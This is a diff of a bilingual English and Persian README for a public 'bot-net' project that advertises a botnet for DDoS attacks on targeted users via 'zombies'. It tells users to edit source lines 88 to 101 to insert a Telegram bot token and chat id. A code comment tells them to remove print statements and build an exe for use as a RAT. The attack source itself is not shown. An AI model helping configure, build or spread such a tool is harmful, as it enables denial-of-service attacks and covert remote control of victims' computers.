@@ -1,10 +1,43 @@
 # bot-net
-###botnet or bot net for ddos and geting target.
+# # botnet or bot net for ddos and geting target.
 
+a bot net for ddos with target users!
+یک دیداسر با استفاده از تارگت های این ابزار و زامبی ها!
 ___________________________
 
 # ***مراحل اجرا***:
 
 - بزودی یک ورژن جدیدش میاد که از پایروگرام استفاده میکنه و خودکار به سرور وصل میشه تا برای ایرانی ها به مشکلی نخوره
 -سورس کاملا ساده ای داره و به همین علت پابلیک شد
-- داخل سورس مشخص شده چه چیز هایی رو قرار بدید
+-  از لاین ۸۸ تا ۱۰۱ رو تغییر بدید داخل سورس مشخص شده چه چیز هایی رو قرار بدید
+
+# ***for run:***
+
+- soon a new version will come, different and more advanced, using the pyrogram library
+- source is open and public is do not premium
+-in source line 88 to 101
+
+
+# ***for use edited source line:***
+
+__line 88 to 101:__
+
+```python
+
+# for useing in rat and bot net just deleted 'print()'s and edit format to exe !
+#..........................................................<<
+#..........................................................<<
+# enter your tokent bot توکن بات را اینجا قرار بدهید:         #..<<
+# مثال :                                                 #..<<
+# tokent : str = '567998766:hbsvchsfdbgfbRDgbfg'        #..<<
+token : str = ''                                        #..<<
+# enter your chat id ایدی عددی رو اینجا قرار بدهید:          #..<<
+# مثال :                                                 #..<<
+# chat_id : str = '162792976'                           #..<<
+chat_id : str = ''                                      #..<<
+#..........................................................<<
+#..........................................................<<
+# برای دانایی بیشتر فایل help-bot-net را مشاهده فرمایید !
+```
+
+
